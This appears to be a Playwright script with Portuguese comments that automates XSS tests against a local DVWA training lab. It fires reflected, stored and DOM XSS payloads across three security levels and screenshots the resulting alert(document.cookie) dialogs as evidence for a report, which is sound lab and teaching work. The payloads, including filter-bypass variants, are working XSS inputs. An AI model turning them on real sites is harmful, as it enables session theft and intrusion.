/**
 * DVWA XSS — Captura automatizada de evidencias (prints).
 *
 * Loga no DVWA, percorre os 9 cenarios (Reflected / Stored / DOM x Low / Medium / High),
 * dispara cada payload, captura a mensagem do alert() via evento `dialog`, injeta um
 * banner-evidencia na pagina (payload + URL + cookie capturado) e tira o screenshot.
 * No final, monta 3 imagens compostas (uma por tipo) prontas para o relatorio.
 *
 * Uso (PowerShell, na pasta xss-evidence):
 *   npm install
 *   npx playwright install chromium
 *   npm run capture          # captura tudo
 *   npm run setup            # cria/reseta o banco do DVWA antes de capturar
 *
 * Variaveis de ambiente opcionais:
 *   DVWA_URL  (default http://localhost:4280)
 *   DVWA_USER (default admin)
 *   DVWA_PASS (default password)
 *   HEADED=1  abre o navegador visivel
 */

const { chromium } = require('playwright');
const fs = require('fs');
const path = require('path');

const BASE = (process.env.DVWA_URL || 'http://localhost:4280').replace(/\/$/, '');
const USER = process.env.DVWA_USER || 'admin';
const PASS = process.env.DVWA_PASS || 'password';
const HEADED = process.env.HEADED === '1';
const DO_SETUP = process.argv.includes('--setup');

const OUT = path.join(__dirname, 'output');
fs.mkdirSync(OUT, { recursive: true });

// --- Cenarios (espelham exatamente os payloads do relatorio) ---
const SCENARIOS = [
  // Reflected: payload no parametro GET `name`
  { type: 'reflected', level: 'low',    payload: '<script>alert(document.cookie)</script>' },
  { type: 'reflected', level: 'medium', payload: '<img src=x onerror=alert(document.cookie)>' },
  { type: 'reflected', level: 'high',   payload: '<svg/onload=alert(document.cookie)>' },
  // Stored: guestbook. `field` indica em qual campo vai o payload.
  { type: 'stored', level: 'low',    field: 'message', payload: '<script>alert(document.cookie)</script>' },
  { type: 'stored', level: 'medium', field: 'name',    payload: '<img src=x onerror=alert(document.cookie)>' },
  { type: 'stored', level: 'high',   field: 'name',    payload: '<svg/onload=alert(document.cookie)>' },
  // DOM: payload no parametro GET `default` (high usa fragmento #)
  { type: 'dom', level: 'low',    payload: '<script>alert(document.cookie)</script>' },
  { type: 'dom', level: 'medium', payload: '</option></select><img src=x onerror=alert(document.cookie)>' },
  { type: 'dom', level: 'high',   payload: 'English#<script>alert(document.cookie)</script>', fragment: true },
];

const TYPE_LABEL = {
  reflected: 'Reflected XSS (xss_r)',
  stored: 'Stored XSS (xss_s)',
  dom: 'DOM-based XSS (xss_d)',
};

const PRINT_MAP = { reflected: 'PRINT_1_reflected', stored: 'PRINT_2_stored', dom: 'PRINT_3_dom' };

const results = [];

async function setSecurity(context, level) {
  await context.addCookies([{ name: 'security', value: level, url: BASE }]);
}

async function login(context) {
  const page = await context.newPage();
  await page.goto(`${BASE}/login.php`, { waitUntil: 'domcontentloaded' });
  const token = await page.$eval('input[name="user_token"]', (el) => el.value).catch(() => null);
  await page.fill('input[name="username"]', USER);
  await page.fill('input[name="password"]', PASS);
  await Promise.all([
    page.waitForLoadState('domcontentloaded'),
    page.click('button[type="submit"], input[type="submit"], [name="Login"]'),
  ]);
  const ok = !/login\.php/.test(page.url());
  await page.close();
  if (!ok) throw new Error(`Login falhou. Confira credenciais e se o banco foi criado (rode "npm run setup"). token=${token}`);
}

async function setupDatabase(context) {
  const page = await context.newPage();
  await page.goto(`${BASE}/setup.php`, { waitUntil: 'domcontentloaded' });
  await page.click('input[name="create_db"], button[name="create_db"]').catch(() => {});
  await page.waitForTimeout(1500);
  await page.close();
}

async function clearGuestbook(context) {
  await context.request.post(`${BASE}/vulnerabilities/xss_s/`, {
    form: { btnClear: 'Clear Guestbook' },
  }).catch(() => {});
}

async function injectBanner(page, { typeLabel, level, payload, url, alertMsg }) {
  await page.evaluate(({ typeLabel, level, payload, url, alertMsg }) => {
    const box = document.createElement('div');
    box.style.cssText =
      'position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#0b6b2f;color:#fff;' +
      'font-family:Consolas,monospace;font-size:13px;padding:10px 14px;border-bottom:3px solid #063d1a;' +
      'box-shadow:0 2px 8px rgba(0,0,0,.4);line-height:1.5';
    const rows = [
      ['CENARIO', `${typeLabel} — nivel ${level.toUpperCase()}`],
      ['PAYLOAD', payload],
      ['URL', url],
      ['alert() CAPTURADO', alertMsg],
    ];
    box.innerHTML = '<b style="color:#9cff9c">[ EVIDENCIA XSS — execucao confirmada ]</b>';
    for (const [k, v] of rows) {
      const line = document.createElement('div');
      const key = document.createElement('span');
      key.style.cssText = 'color:#9cff9c;display:inline-block;min-width:150px';
      key.textContent = k + ': ';
      const val = document.createElement('span');
      val.textContent = v;
      line.appendChild(key);
      line.appendChild(val);
      box.appendChild(line);
    }
    document.body && document.body.insertBefore(box, document.body.firstChild);
    document.body && (document.body.style.paddingTop = box.offsetHeight + 14 + 'px');
  }, { typeLabel, level, payload, url, alertMsg });
}

async function runScenario(context, sc) {
  await setSecurity(context, sc.level);
  const page = await context.newPage();
  const dialogs = [];
  page.on('dialog', async (d) => {
    dialogs.push(d.message());
    await d.accept().catch(() => {});
  });

  let url;
  try {
    if (sc.type === 'reflected') {
      url = `${BASE}/vulnerabilities/xss_r/?name=${encodeURIComponent(sc.payload)}`;
      await page.goto(url, { waitUntil: 'load', timeout: 15000 }).catch(() => {});
    } else if (sc.type === 'stored') {
      await clearGuestbook(context);
      const form = sc.field === 'name'
        ? { txtName: sc.payload, mtxMessage: 'evidencia', btnSign: 'Sign Guestbook' }
        : { txtName: 'lab', mtxMessage: sc.payload, btnSign: 'Sign Guestbook' };
      await context.request.post(`${BASE}/vulnerabilities/xss_s/`, { form });
      url = `${BASE}/vulnerabilities/xss_s/`;
      await page.goto(url, { waitUntil: 'load', timeout: 15000 }).catch(() => {});
    } else if (sc.type === 'dom') {
      // encodeURI preserva `/` (necessario para </option></select>), pois o sink usa decodeURI()
      if (sc.fragment) {
        const [base, frag] = sc.payload.split('#');
        url = `${BASE}/vulnerabilities/xss_d/?default=${encodeURI(base)}#${encodeURI(frag)}`;
      } else {
        url = `${BASE}/vulnerabilities/xss_d/?default=${encodeURI(sc.payload)}`;
      }
      await page.goto(url, { waitUntil: 'load', timeout: 15000 }).catch(() => {});
    }

    await page.waitForTimeout(700); // dar tempo para handlers onerror/onload
    const fired = dialogs.length > 0;
    const alertMsg = dialogs[0] || '(nenhum dialog disparado — verifique manualmente)';
    await injectBanner(page, {
      typeLabel: TYPE_LABEL[sc.type],
      level: sc.level,
      payload: sc.payload,
      url: decodeURI(url),
      alertMsg,
    }).catch(() => {});

    const shot = path.join(OUT, `shot_${sc.type}_${sc.level}.png`);
    await page.screenshot({ path: shot, fullPage: true });

    results.push({ ...sc, url: decodeURI(url), fired, alertMsg, shot });
    console.log(`${fired ? 'OK ' : '!! '} ${sc.type}/${sc.level} -> ${fired ? alertMsg : 'SEM DIALOG'}`);
  } catch (e) {
    console.error(`ERRO ${sc.type}/${sc.level}:`, e.message);
    results.push({ ...sc, url, fired: false, alertMsg: 'ERRO: ' + e.message, shot: null });
  } finally {
    await page.close();
  }
}

function imgDataUri(file) {
  const b64 = fs.readFileSync(file).toString('base64');
  return `data:image/png;base64,${b64}`;
}

async function buildComposite(context, type) {
  const shots = SCENARIOS.filter((s) => s.type === type)
    .map((s) => ({ s, file: path.join(OUT, `shot_${s.type}_${s.level}.png`) }))
    .filter((x) => fs.existsSync(x.file));
  if (!shots.length) return;

  const blocks = shots.map(({ s, file }) => `
    <figure>
      <figcaption>${TYPE_LABEL[type]} — ${s.level.toUpperCase()} — <code>${s.payload.replace(/</g, '&lt;')}</code></figcaption>
      <img src="${imgDataUri(file)}" />
    </figure>`).join('');

  const html = `<!doctype html><html><head><meta charset="utf-8"><style>
    body{margin:0;background:#fff;font-family:Segoe UI,Arial,sans-serif;width:1000px}
    h1{font-size:20px;margin:16px 20px;color:#111}
    figure{margin:0 20px 22px}
    figcaption{font-size:13px;background:#222;color:#fff;padding:6px 10px;border-radius:6px 6px 0 0}
    figcaption code{color:#9cff9c}
    img{display:block;width:100%;border:1px solid #ccc;border-top:none;border-radius:0 0 6px 6px}
  </style></head><body>
    <h1>${TYPE_LABEL[type]} — evidencias Low / Medium / High</h1>
    ${blocks}
  </body></html>`;

  const page = await context.newPage();
  await page.setViewportSize({ width: 1000, height: 800 });
  await page.setContent(html, { waitUntil: 'load' });
  const out = path.join(OUT, `${PRINT_MAP[type]}.png`);
  await page.screenshot({ path: out, fullPage: true });
  await page.close();
  console.log(`Composto gerado: ${out}`);
}

(async () => {
  console.log(`Alvo: ${BASE}  |  usuario: ${USER}`);
  const browser = await chromium.launch({ headless: !HEADED });
  const context = await browser.newContext({ viewport: { width: 1280, height: 900 } });

  try {
    if (DO_SETUP) {
      console.log('Criando/resetando banco (setup.php)...');
      await setupDatabase(context);
    }
    console.log('Logando...');
    await login(context);

    for (const sc of SCENARIOS) await runScenario(context, sc);

    console.log('Montando prints compostos...');
    for (const type of ['reflected', 'stored', 'dom']) await buildComposite(context, type);

    fs.writeFileSync(path.join(OUT, 'results.json'), JSON.stringify(results, null, 2));
    const okCount = results.filter((r) => r.fired).length;
    console.log(`\nConcluido: ${okCount}/${SCENARIOS.length} cenarios com alert capturado.`);
    console.log(`Arquivos em: ${OUT}`);
    console.log('Prints para o relatorio: PRINT_1_reflected.png, PRINT_2_stored.png, PRINT_3_dom.png');
  } catch (e) {
    console.error('\nFALHA:', e.message);
    process.exitCode = 1;
  } finally {
    await context.close();
    await browser.close();
  }
})();
